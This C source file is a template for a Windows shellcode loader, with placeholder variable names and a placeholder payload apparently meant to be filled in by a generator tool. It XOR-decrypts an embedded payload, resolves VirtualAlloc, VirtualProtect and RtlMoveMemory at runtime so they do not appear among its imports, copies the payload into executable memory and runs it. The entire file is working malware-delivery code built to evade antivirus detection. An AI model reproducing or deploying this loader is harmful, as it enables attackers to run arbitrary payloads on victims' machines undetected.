#include <windows.h>

typedef BOOL (WINAPI* $VirtualProtectDec$)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef LPVOID (WINAPI* $VirtualAllocDec$)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD  flProtect);
typedef VOID (WINAPI* $RtlMoveMemoryDec$)(VOID UNALIGNED* Destination,const VOID UNALIGNED* Source, SIZE_T Length);

int main(void) {
	DWORD oldprotect = 0;
	char $EncryptedShellcodeVar$[] = $Payload$;
	
	char key[] = "$Key$";

	char $ShellcodeVar$[sizeof $EncryptedShellcodeVar$];

	int j = 0;

	for (int i = 0; i < sizeof $EncryptedShellcodeVar$; i++) {
		if (j == sizeof key - 1) j = 0;
		$ShellcodeVar$[i] = $EncryptedShellcodeVar$[i] ^ key[j];
		j++;
	}

	$VirtualProtectDec$ $VirtualProtectVar$ = ($VirtualProtectDec$)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualProtect");
	$VirtualAllocDec$ $VirtualAllocVar$ = ($VirtualAllocDec$)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
	$RtlMoveMemoryDec$ $RtlMoveMemoryVar$ = ($RtlMoveMemoryDec$)GetProcAddress(GetModuleHandle("Ntdll.dll"), "RtlMoveMemory");

	LPVOID pAddress = $VirtualAllocVar$(0, sizeof $ShellcodeVar$, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	$RtlMoveMemoryVar$(pAddress, $ShellcodeVar$, sizeof $ShellcodeVar$);

	BOOL isUpdated = $VirtualProtectVar$(pAddress, sizeof $ShellcodeVar$, PAGE_EXECUTE_READ, &oldprotect);

	if (isUpdated != 0) {
		((void(*)())pAddress)();
	}
	return 0;
}